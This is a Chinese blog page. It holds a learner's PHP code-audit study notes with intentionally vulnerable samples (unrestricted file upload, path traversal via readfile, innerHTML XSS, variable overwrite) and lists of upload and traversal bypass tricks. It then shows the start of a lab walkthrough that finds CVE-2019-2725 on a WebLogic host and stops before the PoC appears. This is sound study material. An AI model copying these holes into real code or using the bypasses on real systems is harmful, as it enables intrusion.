<p>dom既可能是存储型，也可能是反射型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content = $_GET[&#x27;content&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&lt;?php echo $content;?&gt;&quot;&gt;</span><br><span class="line">&lt;dic id=&quot;print&quot;&gt;&lt;/dic&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var text = document.getElementById(&quot;text&quot;);</span><br><span class="line">    var print = document.getElementById(&quot;print&quot;);</span><br><span class="line">    print.innerHTML = text.value;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827210315089.png" alt="image-20220827210315089"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827210740514.png" alt="image-20220827210740514"></p>
<h1 id="csrf漏洞"><a href="#csrf漏洞" class="headerlink" title="csrf漏洞"></a>csrf漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">挖掘思路</span><br><span class="line">后台功能模块：管理后台，会员中心，添加用户等</span><br><span class="line">被引用的核心文件里面没有验证token和referer相关的代码</span><br><span class="line"></span><br><span class="line">没带token:可以直接请求这个页面</span><br><span class="line">没带referer:返回相同的数据</span><br></pre></td></tr></table></figure>

<p>这个简单，我就不写代码了，就是后端只验证了session，但是没有验证origin或者referer等参数，或者没有加上csrftoken，导致这么一个漏洞。</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">文件上传可控点</span><br><span class="line">content-length，即上传内容大小</span><br><span class="line">MAX_FILE_SIZE,即上传内容的最大长度</span><br><span class="line">filename,即上传文件名</span><br><span class="line">content-type，即上传文件内心</span><br><span class="line">请求保重的乱码字段，即上传文件的内容</span><br><span class="line">有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">挖掘思路</span><br><span class="line">上传点都调用同一个上传类，直接全局搜索上传函数</span><br><span class="line">黑盒寻找上传点，代码定位</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">代码案例</span><br><span class="line">name：客户端的原始上传文件名称</span><br><span class="line">Type：上传文件的MIME类型</span><br><span class="line">Tmp_name：服务器端用来保存上传文件的临时文件夹</span><br><span class="line">Error：上传文件时的错误信息</span><br><span class="line">Size：上传文件的大小，单位是</span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$upload_dir</span> = <span class="string">&quot;D:\phpStudy\PHPTutorial\WWW\daima\upload&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$upload_name</span> = <span class="variable">$upload_dir</span>.<span class="string">&quot;\\&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$upload_name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type:&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Size:&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]/<span class="number">1024</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Name&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>upload.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;上传文件&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> <span class="attr">name</span>=<span class="string">&quot;4096&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>下面的绕过讲师只是提一下，后面我可能自己会总结</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件上传绕过-客户端</span><br><span class="line">用firebug将form表单中的onsubmit事件删除</span><br><span class="line">上传木马文件，burp拦截数据包，修改扩展名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">文件上传绕过-服务端</span><br><span class="line">黑白名单过滤</span><br><span class="line">修改mime类型</span><br><span class="line">截断上传攻击</span><br><span class="line">.htaccess文件攻击</span><br><span class="line">解析漏洞，文件包含漏洞</span><br><span class="line">目录验证</span><br></pre></td></tr></table></figure>

<h1 id="目录穿越以及文件包含"><a href="#目录穿越以及文件包含" class="headerlink" title="目录穿越以及文件包含"></a>目录穿越以及文件包含</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    readfile(<span class="string">&#x27;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220828162149341.png" alt="image-20220828162149341"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">目录穿越绕过方式</span><br><span class="line">进行url编码</span><br><span class="line">进行16位unicode编码</span><br><span class="line">进行双倍url编码</span><br><span class="line">进行超常utf-8 unicode编码</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220828162321840.png" alt="image-20220828162321840"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">目录穿越修复方案</span><br><span class="line">在url中不要使用文件名称作为参数</span><br><span class="line">检查使用者输入的文件名是否有目录阶层字符</span><br><span class="line">在php.ini文件中设置open_basedir来指定文件的目录</span><br><span class="line">使用realpath函数来展开文件路径中的&quot;./&quot;、&quot;../&quot;等字符，然后返回绝对路径名称</span><br><span class="line">使用basename函数来返回不包含路径的文件名称</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">文件包含-挖掘经验</span><br><span class="line"></span><br><span class="line">模块加载，cache调用，传入的参数拼接包含路径</span><br><span class="line"></span><br><span class="line">include()</span><br><span class="line">使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行</span><br><span class="line"></span><br><span class="line">inclue_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次</span><br><span class="line"></span><br><span class="line">require()</span><br><span class="line">使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</span><br><span class="line"></span><br><span class="line">require_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">远程包含</span><br><span class="line">RFI允许攻击者包含远程文件，远程文件包含需要设置allow_url_include = On 四个文件都支持HTTP、FTP等协议，相对本地文件包含更容易利用</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">本地包含-利用方式</span><br><span class="line">%00截断</span><br><span class="line"></span><br><span class="line">记录错误日志文件</span><br></pre></td></tr></table></figure>

<p>远程包含-利用方式</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220828170533205.png" alt="image-20220828170533205"></p>
<h1 id="任意文件读取及删除漏洞"><a href="#任意文件读取及删除漏洞" class="headerlink" title="任意文件读取及删除漏洞"></a>任意文件读取及删除漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">文件读取-挖掘经验</span><br><span class="line">allow_url_fopen选项激活了URL形式的fopen封装协议是的可以访问URL对象例如文件，默认的封装协议提供ftp和http协议来访问远程文件，一些扩展库例如zlib可以能会注册更多的封装协议</span><br><span class="line"></span><br><span class="line">fopen()</span><br><span class="line">file_get_contents()</span><br><span class="line">fread</span><br><span class="line">fgets</span><br><span class="line">fgetss</span><br><span class="line">file</span><br><span class="line">fpassthru</span><br><span class="line">parse_ini_file</span><br><span class="line">readfile</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件删除-挖掘经验</span><br><span class="line">unlink($file,$cont)</span><br></pre></td></tr></table></figure>

<h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">漏洞危害</span><br><span class="line">比如说文件上传页面的白名单，我们可以覆盖白名单导致文件上传</span><br><span class="line">用户注册页面控制没覆盖的未初始化变量导致sql</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220828172043564.png" alt="image-20220828172043564"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常见的遍历方式释放代码，可能导致变量覆盖漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span> =&gt; <span class="variable">$_value</span>)&#123;</span><br><span class="line">        <span class="variable">$$_key</span> = addslashes(<span class="variable">$_value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extract()变量覆盖</span><br><span class="line">int extract( $array , extract_rules,prefix )</span><br><span class="line">$array 关联的数组，受第二个和第三个参数的影响</span><br><span class="line">extract_rules  对待非法/数字和冲突的键名的方法将根据去除标记</span><br><span class="line">prefix  尽在第二个参数特殊时需要，添加前缀</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829141621485.png" alt="image-20220829141621485"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parse_str()变量覆盖</span><br><span class="line">void parse_str(string $encoded_string [,array &amp;$result])</span><br><span class="line">incoded_string输入的字符串</span><br><span class="line">result 变量将会以数组元素的形式存入到这个数组，作为替代</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import_request_variables()</span><br><span class="line">（PHP 4&gt;= 4.1.0 , php5 &lt; 5.4.0）</span><br><span class="line">bool import_request_variables(string $types[,string $prefix])</span><br><span class="line">$type 指定需要导入的变量。可以用字母&#x27;G&#x27;,&#x27;P&#x27;,&#x27;C&#x27;来表示get，post，cookie</span><br><span class="line">$prefix 变量名前缀</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修复方案</span><br><span class="line">在php.ini文件中设置register_globals=off</span><br><span class="line">使用原始变量数组，如$_POST,$_GET等数组变量进行操作</span><br><span class="line">不适用foreach语句来遍历$_GET变量，而改用[(index)]来指定</span><br><span class="line">验证变量是否存在，注册变量前先判断变量是否存在</span><br></pre></td></tr></table></figure>

<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()</span><br><span class="line">unserialize()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">漏洞成因</span><br><span class="line">反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，漏洞根据不同的代码可以导致各种攻击，如代码注入、sql注入、目录遍历等等</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">序列化的不同结果</span><br><span class="line">public</span><br><span class="line">private</span><br><span class="line">protect</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test1</span> = <span class="string">&quot;dhk 2002&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test2</span> = <span class="string">&quot;dhk 2002&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test3</span> = <span class="string">&quot;dhk 2002&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829144838482.png" alt="image-20220829144838482"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">漏洞本质</span><br><span class="line">unserialize函数的变量可控</span><br><span class="line">php文件中存在可利用的类，类中有魔术方法</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829150623976.png" alt="image-20220829150623976"></p>
<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">变量类型</span><br><span class="line">标准类型：布尔boolen、整型integer、浮点floadt、字符string</span><br><span class="line">复杂类型：数组array、对象object</span><br><span class="line">特殊类型：资源resource</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829155633444.png" alt="image-20220829155633444"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829155648037.png" alt="image-20220829155648037"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829155656537.png" alt="image-20220829155656537"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829155706905.png" alt="image-20220829155706905"></p>
<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file://协议</span><br><span class="line">用于访问本地系统文件</span><br><span class="line">allow_url_fopen:off/on</span><br><span class="line">allow_url_include:off/on</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://filter</span><br><span class="line">读取源代码并进行base64编码输出</span><br><span class="line">allow_url_fopen:off/on</span><br><span class="line">allow_url_include:off/on</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://input</span><br><span class="line">可以访问请求的原始数据的只读流</span><br><span class="line">allow_url_fopen:off/on</span><br><span class="line">allow_url_include:on</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data://</span><br><span class="line">数据</span><br><span class="line">allow_url_fopen:on</span><br><span class="line">allow_url_include:on</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="十三">
      <meta itemprop="description" content="潜心学习，不骄不躁">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="十三の博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/" class="post-title-link" itemprop="url">vulnstack 红日靶场 二</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-23 16:29:18" itemprop="dateCreated datePublished" datetime="2022-08-23T16:29:18+08:00">2022-08-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-12-08 14:23:30" itemprop="dateModified" datetime="2022-12-08T14:23:30+08:00">2022-12-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="vulnstack-红日靶场-二"><a href="#vulnstack-红日靶场-二" class="headerlink" title="vulnstack 红日靶场 二"></a>vulnstack 红日靶场 二</h1><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>以下是拓扑图</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/1.png" alt="img"></p>
<p>1qaz@WSX</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">web和pc两个网卡，一个nat一个仅主机，nat使用自动获取ip</span><br><span class="line">域控只有一个网卡，仅主机，只用能用内网访问</span><br><span class="line"></span><br><span class="line">开启服务</span><br><span class="line">进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径</span><br><span class="line">使用管理员才能进去administrator/1qaz@WSX</span><br><span class="line">以管理员权限执行startWebLogic</span><br></pre></td></tr></table></figure>

<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><p>首先拿到目标ip，我们进行一个端口扫描。</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220818213441285.png" alt="image-20220818213441285"></p>
<p>其他端口的测试这里就不说了，这里我们使用weblogic扫描工具</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220818221438834.png" alt="image-20220818221438834"></p>
<p>存在CVE-2019-2725</p>
<p>在网上找到利用方法</p>
<p>访问</p>
<p><a target="_blank" rel="noopener" href="http://192.168.100.131:7001/_async/AsyncResponseService">http://192.168.100.131:7001/_async/AsyncResponseService</a></p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220818221643711.png" alt="image-20220818221643711"></p>
<p>随即使用poc</p>
